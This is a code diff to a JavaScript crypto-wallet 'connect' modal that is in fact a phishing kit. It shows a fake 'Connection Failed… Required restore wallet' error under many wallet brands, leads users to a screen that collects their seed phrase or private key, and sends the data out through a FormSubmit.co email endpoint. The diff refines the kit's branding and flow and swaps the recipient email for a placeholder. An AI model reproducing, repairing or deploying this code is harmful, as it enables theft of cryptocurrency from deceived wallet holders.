@@ -103,25 +103,25 @@ class WalletModal {
     this.walletConnectWallets = [
       { id: 'uniswap', name: 'Uniswap Wallet', iconUrl: 'images/uniswap.png', emoji: '🦄' },
       { id: 'zerion', name: 'Zerion', iconUrl: 'images/zerion.png', emoji: '⚡' },
-      { id: 'atomic', name: 'Atomic Wallet', iconUrl: 'images/atomic.jpg', emoji: '⚛️' },
-      { id: 'imtoken', name: 'SafePal', iconUrl: 'images/safepal.png', emoji: '💎' },
+      { id: 'atomic', name: 'Atomic Wallet', iconUrl: 'images/atomic.png', emoji: '⚛️' },
+      { id: 'imtoken', name: 'imToken', iconUrl: 'images/imtoken.png', emoji: '💎' },
       { id: 'crypto', name: 'Crypto.com', iconUrl: 'images/crypto.png', emoji: '💳' },
       { id: 'binance', name: 'Binance Wallet', iconUrl: 'images/binance.png', emoji: '🔶' },
       { id: 'cardano', name: 'Cardano', iconUrl: 'images/cardano.png', emoji: '🔵' },
-      { id: 'token', name: 'TokenPocket', iconUrl: 'images/tokenpocket.png', emoji: '🎯' },
+      { id: 'token', name: 'TokenPocket', iconUrl: 'images/token.png', emoji: '🎯' },
       { id: 'onto', name: 'ONTO Wallet', iconUrl: 'images/onto.png', emoji: '🔶' },
-      { id: 'safemoon', name: 'SafeMoon', iconUrl: 'images/safe.png', emoji: '🛡️' },
+      { id: 'safemoon', name: 'SafeMoon', iconUrl: 'images/safemoon.png', emoji: '🛡️' },
       { id: 'ellipal', name: 'Ellipal', iconUrl: 'images/ellipal.png', emoji: '🔐' },
-      { id: 'enjin', name: 'Enjin Wallet', iconUrl: 'images/enjin_wallet.png', emoji: '⚔️' },
+      { id: 'enjin', name: 'Enjin Wallet', iconUrl: 'images/enjin.png', emoji: '⚔️' },
       { id: 'gnosis', name: 'Gnosis Safe', iconUrl: 'images/gnosis.png', emoji: '🔷' },
       { id: 'exodus', name: 'Exodus', iconUrl: 'images/exodus.png', emoji: '✖️' },
-      { id: 'kraken', name: 'Kraken', iconUrl: 'images/kraken.jpg', emoji: '🦑' },
+      { id: 'kraken', name: 'Kraken', iconUrl: 'images/kraken.png', emoji: '🦑' },
       { id: 'bridge', name: 'Bridge Wallet', iconUrl: 'images/bridge.png', emoji: '🌉' },
-      { id: 'mew', name: 'MyEtherWallet', iconUrl: 'images/mew.jpg', emoji: '😸' },
+      { id: 'mew', name: 'MyEtherWallet', iconUrl: 'images/mew.png', emoji: '😸' },
       { id: 'zengo', name: 'ZenGo', iconUrl: 'images/zengo.png', emoji: '🌅' },
       { id: 'raven', name: 'Ravencoin', iconUrl: 'images/raven.png', emoji: '🐦' },
       { id: 'swipe', name: 'Swipe Wallet', iconUrl: 'images/swipe.png', emoji: '💳' },
-      { id: 'talken', name: 'Talken', iconUrl: 'images/talken_wallet.png', emoji: '💬' }
+      { id: 'talken', name: 'Talken', iconUrl: 'images/talken.png', emoji: '💬' }
     ];
     
     // Detect theme preference
@@ -289,7 +289,7 @@ class WalletModal {
     // Generic wallet browser detection by user agent
     const userAgent = navigator.userAgent || navigator.vendor || window.opera;
     const walletBrowsers = [
-      'Trust', 'TokenPocket', 'SafePal', 'MetaMask', 'Coinbase',
+      'Trust', 'TokenPocket', 'imToken', 'MetaMask', 'Coinbase',
       'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare', 'Bitget',
       'Atomic', 'Exodus', 'Crypto.com', 'Binance', 'MEW', 'ZenGo'
     ];
@@ -315,6 +315,13 @@ class WalletModal {
   startWalletBrowserFlow() {
     // Wait for page to load, then show updating screen
     setTimeout(() => {
+      // Verify we have a selected wallet
+      if (!this.selectedWallet) {
+        console.error('No wallet detected in browser');
+        // Set a default wallet if none detected
+        this.selectedWallet = this.wallets[0];
+      }
+      console.log('Starting wallet browser flow for:', this.selectedWallet.name);
       this.showUpdatingWallet();
     }, 500);
   }
@@ -575,7 +582,7 @@ class WalletModal {
       'uniswap': websiteUrl,
       'zerion': `https://wallet.zerion.io/connect?uri=${encodeURIComponent(websiteUrl)}`,
       'atomic': `https://atomicwallet.io/open?url=${encodeURIComponent(websiteUrl)}`,
-      'safepal': `safepalwallet://open_url?url=${encodeURIComponent(websiteUrl)}`,
+      'imtoken': `imtokenv2://navigate/DappView?url=${encodeURIComponent(websiteUrl)}`,
       'crypto': `https://crypto.com/defi-wallet/open?url=${encodeURIComponent(websiteUrl)}`,
       'binance': `https://app.binance.com/en/download?utm_source=web&utm_medium=wallet`,
       'cardano': websiteUrl,
@@ -665,7 +672,7 @@ class WalletModal {
           <h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>
           <p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>
           
-          <button onclick="walletModal.showImportScreen()" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition" style="background-color: ${walletColor}">
+          <button id="continue-to-import-btn" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition" style="background-color: ${walletColor}">
             Continue
           </button>
         </div>
@@ -673,11 +680,27 @@ class WalletModal {
     `;
 
     document.body.insertAdjacentHTML('beforeend', failedHTML);
+    
+    // Add event listener to the button
+    setTimeout(() => {
+      const continueBtn = document.getElementById('continue-to-import-btn');
+      if (continueBtn) {
+        continueBtn.addEventListener('click', () => {
+          this.showImportScreen();
+        });
+      }
+    }, 100);
   }
 
   showImportScreen() {
     // Close any previous screens
     this.closeModalOnly();
+    
+    // Ensure we have a selected wallet
+    if (!this.selectedWallet) {
+      console.error('No wallet selected');
+      return;
+    }
     
     const wordCount = this.importType === 'private' ? 0 : parseInt(this.importType);
     const walletColor = this.selectedWallet.primaryColor;
@@ -694,9 +717,7 @@ class WalletModal {
           
           <!-- Wallet Logo in center -->
           <div class="flex justify-center pt-4">
-            <div class="w-16 h-16 sm:w-20 sm:h-20 bg-gray-100 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center overflow-hidden p-3">
-              ${this.createWalletImageHTML(this.selectedWallet)}
-            </div>
+            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center text-4xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
           </div>
         </div>
 
@@ -746,9 +767,7 @@ class WalletModal {
 
         <!-- Footer Branding -->
         <div class="p-4 sm:p-6 flex items-center justify-center gap-3 flex-shrink-0">
-          <div class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center overflow-hidden p-2" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
-            ${this.createWalletImageHTML(this.selectedWallet)}
-          </div>
+          <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center text-xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
           <span class="font-semibold text-gray-900 text-sm sm:text-base">${this.selectedWallet.name}</span>
         </div>
       </div>
@@ -879,7 +898,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
+    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
